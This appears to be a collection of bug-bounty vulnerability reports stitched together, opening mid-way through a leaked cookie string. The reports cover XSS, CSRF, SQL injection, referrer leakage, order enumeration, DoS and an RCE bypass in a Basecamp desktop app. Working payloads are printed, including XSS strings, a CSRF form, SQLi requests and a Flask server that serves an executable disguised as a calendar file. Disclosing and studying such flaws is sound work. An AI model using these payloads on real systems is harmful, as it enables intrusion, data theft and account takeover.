+1wm-cseu-id=%22acd409d8-0f55-4dfd-ac79-d604c5af274e%22; _ga=GA1.2.1915629716.1598908964; wm-fgug=true; wm-ueug=%22b904c8fd-f624-4afb-8050-25f31b3b9cea%22; wm-nor=true; _gid=GA1.2.244633304.1603115085; wm-ueuT=%22b904c8fd-f624-4afb-8050-25f31b3b9cea%22; wm-hb={%22sendBaseTime%22:1603115100166}; wm-wmv=%22b904c8fd-f624-4afb-8050-25f31b3b9cea%22; wm-ds-lfb=%22{}%22; wm-ssn=%22758bcf15-12bc-497e-ab66-f82c25747f45%22; wm-ssn-ct=1603118590494; wm-po-q=null; wm-prsst={%22tId%22:-1%2C%22stt%22:0%2C%22step%22:-1%2C%22spn%22:0%2C%22plgd%22:%22%22%2C%22pint%22:null%2C%22splt%22:[]%2C%22sph%22:[]%2C%22igd%22:null}; wm-ds-lbp=%22[]%22; wm-ds-b=%22[]%22; wm-ds-hb=%22[]%22; wm-ds-lbb=%22{}%22; wm-smtp-init={%22type%22:6}; wm-ds-s=%22[]%22; shoppingcart_coupons=%5B%5D; multiVPoll=; c-s=expires=1603207989~access=/clientimg/informatica/*!/content/informatica/*~md5=832a84c8a012e7d42c375195181dde62; amplitude_id_a328ec1895b18ee52643ef53449b6ecbcsod.com=eyJkZXZpY2VJZCI6IjgwYTA3ZDIxLTA3ZDctNDc4Mi1iNzIxLTc2NTkzMDJkYzg3OFIiLCJ1c2VySWQiOiJENDA4OTY2NUE4OTc5REMyQjUyNDhGMkM1NTk2Q0E1MjdEMzVGQUJFMzA2MTc5REQ0NjA5NEUyQUU1QUJCQUMxIiwib3B0T3V0IjpmYWxzZSwic2Vzc2lvbklkIjoxNjAzMTIxMTg3NTM0LCJsYXN0RXZlbnRUaW1lIjoxNjAzMTIxNTkyODA3LCJldmVudElkIjoyMjIsImlkZW50aWZ5SWQiOjIxOSwic2VxdWVuY2VOdW1iZXIiOjQ0MX0=; wm-po-p=13; wm-po-r=13; wm-dmn=csod.com; _gat=1; wm-ds-lb=%22{}%22
+What the XSS saw:
+█████
+Note that this is leaking what appears to be another customer's data
+The full report:
+████████
+Impact
+With this blind XSS vulnerability, a malicious actor could download malware, install a keylogger, steal the admin cookie, and learn IPs of the backend servers and softwares. Also as shown by the screenshot it leaks singular user's names and their corresponding email addresses.
+
+
+
+Description:
+Reflected XSS vulnerabilities arise when the application accepts a malicious input script from a user and then this is executed in the victim's browser.Since the XSS is reflected, the attacker has to trick the victim into executing the payload, usually using another website. In this case, the vulnerable URL is ████ and the vulnerable parameter is the POST keyword parameter.
+Reproduction steps
+1 - Perform a new search request and intercept the resulting request with a interceptor proxy (for example, using Burp).
+2 - Use the following payload for the POST keyword parameter.
+Code 59 Bytes
+1<a+href="ja%0A%0Dvascript:alert(document.domain)">Click</a>
+The above payload also allows to bypass the WAF present on the server.
+3 - A new link called "Click" will be shown on the resulting webpage. A click on the link will trigger the payload execution.
+Impact
+Depending on the severity of the vulnerability, user cookies could be stolen enabling an attacker to abuse accounts,or webpage content could be modified tricking users to surrendering their personal data, but possibilities are endless. In this case, my PoC shows an innocuous popup containing the execution scope of the vulnerability.
+
+
+
+Description:
+I have found out that on the https://www.███████ domain, you initiate POST request in order to look up for case studies, the parameter keyword on the request, allows the usage of bad characters such as < " ', although XSS payloads are pretty secured, HTML injection is an option.
+As you might notice because this is a POST request, and the content is not initiated by the URL, i need to chain it with CSRF so the victim will get presented the malicious infected page, which you will see on the Video PoC, even upon refreshing is remain infected with the injection, only when you open a new tab, the page rests.
+This allows me implementing malicious links and contents inside the case studies search page.
+████████
+Step-by-step Reproduction Instructions
+Navigate to https://www.█████
+Craft a malicious HTML injection as you wish, I have injected: "<a href=https://naglinagli.github.io>Click here to win 1000$!</a>"
+Save the POST request and craft CSRF payload.
+HTML snippet of the CSRF payload:
+Code 844 Bytes
+1<html>
+2  <!-- CSRF PoC - generated by Burp Suite Professional -->
+3  <body>
+4  <script>history.pushState('', '', '/')</script>
+5    <form action="https://www.███████" method="POST">
+6      <input type="hidden" name="keyword" value="&lt;a&#32;href&#61;https&#58;&#47;&#47;naglinagli&#46;github&#46;io&gt;Click&#32;here&#32;to&#32;win&#32;1000&#36;&#33;&lt;&#47;a&gt;" />
+7      <input type="hidden" name="Find&#32;Case&#32;Studies" value="Find&#32;Case&#32;Studies" />
+8      <input type="hidden" name="crimetype" value="none" />
+9      <input type="hidden" name="year" value="none" />
+10      <input type="hidden" name="gender" value="search&#46;php" />
+11      <input type="hidden" name="employeetype" value="none" />
+12      <input type="hidden" name="age" value="none" />
+13      <input type="submit" value="Submit request" />
+14    </form>
+15  </body>
+16</html>
+Suggested Mitigation/Remediation Actions
+Sanitizing malicious characters on the keyword parameter.
+Best Regards,
+nagli
+Impact
+CSRF to Stored HTML injection on the case-studies search page.
+
+
+
+Hi Security Team,
+Description
+Full Description in #997350
+The owner of that website can perform a security compromise by grabbing those links.
+Solution:
+The solution is very very SIMPLE. Just include the following HTML code in the following in code between <head> tags of the html of the page: <meta name="referrer" content="never" />
+This will not send referrer headers to third party websites.
+Reproduction Instructions /
+1)Open your Store & add social media Links.
+2)Click preview_Via_`Online_store`.PNG (F1045363).
+3)Now turn burp suite intercept on and click on Click on any social media link(on follow us section). Check for the requests having the Link in Referrer as third party website. And copy the Link.
+4)Now turn intercept off and Open Link.(with that token) in other tab,browser or PC.
+5)Now you you sucesfully catch/preview all action in your-store.myshopify.com from store owner without store password.
+Preview all action/Login
+Proof of Concept
+01.PNG (F1045355)
+02.PNG (F1045356)
+03.PNG (F1045357)
+04.PNG (F1045358)
+05.PNG (F1045359)
+Video_1.avi (F1045360)
+Additional Information:
+Note also that if users can author content within the application then an attacker may be able to inject links referring to a domain they control in order to capture data from URLs used within the application.
+Impact
+As you can see in the Referrer preview Link is getting leaked to third party sites. So, the person who has the complete control over that particular third party site can Use the Link to preview all action in your-store.myshopify.com from store owner without store password.
+
+
+
+Description:
+SQL Injection is a vulnerability which allows interference with the queries performed on a database, to obtain sensitive information which could be really useful to attackers. A web application database is often queried using user-requests parameters, which when are not properly sanitized can be modified injecting malicious code. In this case, the vulnerable endpoint is http://www.████████ and the vulnerable parameter is the POST rnum parameter. Respecting the program guidelines, I performed the minimal amount of testing required to prove that a vulnerability existed, but please tell me if I can bring the exploitation further to give more information.
+Reproduction steps
+1 -Repeat the below requests with a interceptor proxy (for example, using Burp).
+Code 609 Bytes
+1POST ████ HTTP/1.1
+2Host: www.████
+3Content-Length: 72
+4Cache-Control: max-age=0
+5Upgrade-Insecure-Requests: 1
+6Origin: http://www.███████
+7Content-Type: application/x-www-form-urlencoded
+8User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36
+9Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+10Referer: http://www.███████████
+11Accept-Encoding: gzip, deflate
+12Accept-Language: en-US,en;q=0.9,it-IT;q=0.8,it;q=0.7
+13Cookie: PHPSESSID=█████
+14Connection: close
+15
+16███████
+Code 618 Bytes
+1POST ██████████ HTTP/1.1
+2Host: www.███████
+3Content-Length: 72
+4Cache-Control: max-age=0
+5Upgrade-Insecure-Requests: 1
+6Origin: http://www.█████
+7Content-Type: application/x-www-form-urlencoded
+8User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36
+9Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+10Referer: http://www.████████████████
+11Accept-Encoding: gzip, deflate
+12Accept-Language: en-US,en;q=0.9,it-IT;q=0.8,it;q=0.7
+13Cookie: PHPSESSID=████
+14Connection: close
+15
+16█████
+In the first case, the record obtained from the database is the following:
+Code 6 Bytes
+1██████
+██████
+Whilst in the second case, the record obtained is:
+Code 3 Bytes
+1███
+█████
+This confirms that the OFFSET clause is concatenated to the original query and there is the possibility to exploit a SQL Injection.
+Impact
+The vulnerability could allow an attacker to dump sensitive and personal data from the web application database (such as usernames and password hashes) or to perform authentication bypasses.
+
+
+
+Summary:
+The endpoint https://www.glassdoor.co.in/FAQ/Microsoft-Question-FAQ200086-E1651.htm?countryRedirect=true is vulnerable to reflected XSS.
+Injecting any input in path will be reflected back without any sanitisation.
+Affected URL or select Asset from In-Scope: https://www.glassdoor.co.in/FAQ/Microsoft-Question-FAQ200086-E1651.htm?countryRedirect=true
+Injection point: Path
+Vulnerability Type: Reflected XSS
+Browsers tested: Safari, Chrome, Firefox
+Payload: %22%3e%3cimg%20onerro%3d%3e%3cimg%20src%3dx%20onerror%3dalert%601%60%3e
+Steps To Reproduce:
+Navigate to https://www.glassdoor.co.in/FAQ/Microsoft-Question-FAQ200086-E1651.htm?countryRedirect=true
+input the payload inside path.
+3.Open this url: https://www.glassdoor.co.in/FAQ/Mic%22%3e%3cimg%20onerro%3d%3e%3cimg%20src%3dx%20onerror%3dalert%601%60%3e
+rosoft-Question-FAQ200086-E1651.htm?countryRedirect=true
+An alert will be popped up.
+Impact
+Using XSS an attacker can steals the victim cookie and can also redirect him to a malicious site controlled by the attacker.
+
+
+
+The Windows application for Basecamp, allows a "Download" feature for images in your posts. Under certain restrictions, those files are downloaded and sometimes even automatically opened (executed). The file will be executed if it's a download from an internal URL and the mimetype is text/calendar. But these restrictions can be bypassed to execute an attacker crafted file.
+I was able to craft a link, which when clicked by a user, will be downloaded and executed!
+To get file execution on the user, we bypass the restrictions first:
+There is a regular expression which checks for "internal domains", which can easily be bypassed by controlling the subdomain. The host pattern is /(launchpad\.37signals\.com|launchpad\.(?:dev|test))/ and /(3\.(?:staging\.)?basecamp\.com|bc3\.(?:dev|test))/. By controlling the subdomain, and setting it to something like launchpad.dev.mydomain.com, we can bypass this regular expression verification.
+Since we'll be sending the request to our own server, we simply need to return text/calendar as the content-type header. This can be seen in the Electron code in OPENABLE_MIME_TYPES = new Set(["text/calendar"]);
+And then when adding the URL to your post, simply add the ?attachment=true to the URL.
+To reproduce, simply register any subdomain that starts with launchpad.dev. (mine is launchpad.dev.████).
+An HTTP server with the needed mimetype header, can be setup with Flask easily with this code:
+Code 267 Bytes
+1from flask import Flask, send_from_directory
+2app = Flask(__name__)
+3@app.route('/<path:path>')
+4def hello(path):
+5    return send_from_directory(".", "file.exe", as_attachment=True, mimetype="text/calendar")
+6if __name__ == '__main__':
+7    app.run(port=80,host="0.0.0.0")
+Then add the link to your post with the appropriate attachment parameter, as such:
+http://launchpad.dev.█████████/file.exe?attachment=true
+Impact
+Remote code execution on any user which clicks a link on your crafted post through the desktop app.
+
+
+
+Description:
+When you submit a request at https://██████████, the content is being sent to the administrators of the application, and you will be presented with your request status at https://████
+The Description field at the request status page is prone to stored xss and blind stored XSS injection, because there is no sanitization on the input being inserted.
+As for now this is self (because the link is for the account), i'm 100% sure that when an administrator will check the request his details will get sent to my email, and i have a xss payload stored on my user.
+████████
+Step-by-step Reproduction Instructions
+Register to https://██████████ / login to my account (████)
+Navigate to https://███
+Craft your XSS payload on the description window
+Submit your request
+Navigate to https://█████████
+The javascript will execute.
+Suggested Mitigation/Remediation Actions
+Sanitizing the input being inserted into the description window field.
+Best regards
+nagli
+Impact
+Stored blind XSS on the pac.whs.mil website which could lead to administrator credentials being leaked.
+
+
+
+It came to my attention that the Shopify Chat application allows a customer to retrieve its order status by only providing the order email and number.
+Noticing that it results in being provided the order status page link, I started playing a bit with both parameters and I found out that it is possible to:
+Access any customer first order without having to provide any actual order number
+Provide multiple order number within the same payload resulting in orders "enumeration"
+As it stands, I'm not sure if it has to do with SQL injection. I'll keep digging.
+Steps to reproduce
+Having a shop with Shopify Chat application installed (with OrderLookup feature), open up https://{shop}.myshopify.com/?chat
+Within the Shopify Chat Widget, click on I need an update on my order
+Click on Enter order information and fill in the form by entering any customer email and order number
+Using Burp Client and/or any other way to intercept the request that is being made to https://shopify-chat.shopifycloud.com/api/storefront/conversations/{id}/order_lookup and copy its content so it can be replayed
+The intercepted payload should looks like this:
+Code 99 Bytes
+1{
+2	"order_lookup":
+3	{
+4		"email": "francisbeaudoin@wearehackerone.com",
+5		"order_number":"1000"
+6	}
+7}
+As mentioned earlier, there's two different exploit.
+First one: Access any customer's first order details
+From the above payload:
+Update email value to the targeted customer email address
+Update order_number value to 1 OR 2
+If the targeted customer email address have made any order, you'll be given the link to access his first order details.
+Second one: Enumerate orders by providing multiple order numbers at once
+From the above payload:
+Update email value to the targeted customer email address
+Update order_number value to 1000 OR 1001 OR 1002 OR 1003 OR 1004 OR 1005.
+Given that the customer does have any order having a number between 1000 and 1005, you'll be given the link to access the first matching one. If any, all you have to do to get the next one is to remove that specific order number from the payload and resend the request once again.
+While testing, I used a payload with around 50 different numbers and it did work. My assumption there is that we can input a big payload but didn't go much deeper just in case it ends up being evaluated in SQL.
+On a site note, I think that order lookup should have some kind of rate-limiting to prevent any abuse.
+Demo
+██████████
+Impact
+Retrieve customers orders informations
+
+
+
+Summary :
+after trying to change my initial name to something long i found out that their are no limits to how long it can be , so i directly changed it to something very long name.txt (F1050497) which caused my account to really slow down when accessing it and in the android app , it just keeps crashing whenever i open it ( no way to access my account at all ) + if i make it longer i get a 500 Internal Server Error response which highly suggests that this can cause a server side denial of service .
+Description:
+due to not checking the length of the name one can change it to a very long one causing both a server side denial of service and a client side one
+server side :
+one can send multiple requests to change the name of the account and each of them containing a very long name which will cause a 500 internal server error leading to an extensive Resource Consumption.
+client side :
+if one is able to change the name another account he will also have the ability to crash his android app therefore preventing him from accessing his account.
+if one with a long name sends a message to any email he will slowwwwww down everything where the message appears including folders (inbox , trash ..) and prevent him from accessing his contacts where the email's name also appears , because the app will hang on a loading screen for about 40min each time , and this can be more if for example he sends multiple messages or use multiple accounts ( each on with a long name ) to send a message to the victim mail.
+Proof of Concept:
+open https://app.hey.com/contacts/%user_id_number%/user/editand change the name to the one attached name.txt (F1050497) and submit.
+now u can't open the android app and u can slow down anyone's account just by sending them a message (or multiple ones).
+Impact
+Attacker can perform a DoS Attack against the server
+slow down anyone's account
+crash the android app
+
+
+
+Hi DoD team,
+I found a CSRF to account takeover in https://███████/
+NOTE:
+Try to open the site in firefox because chrome sometimes is not allowing to open the site.
+Summary:
+There is no protection against CSRF in changing email which lead to CSRF to account takeover on https://██████/.
+Step-by-step Reproduction Instructions
+I have made a video POC in which I have shown the account takeover clearly Please do watch for better understanding
+Login as victim and check your infos in the account details
+Open the CSRF malicious file which I have attached (csrf_POC.html)
+Now the email is different (you can also change your name and other fields as well)
+Now you can simply takeover the account
+All you have to do is click on reset password on main page and enter the email you used to trick the victim and you will get instructions to reset the password. And you can successfully takeover the account
+Suggested Mitigation/Remediation Actions
+Use captchas and CSRF-tokens for be sure that the victim is changing the datas knowing that.
+Impact
+It is a critical issue as i was able to takeover anyone account using this attack. This vulnerability is high/critical because I was able to perform account takeover
+
+
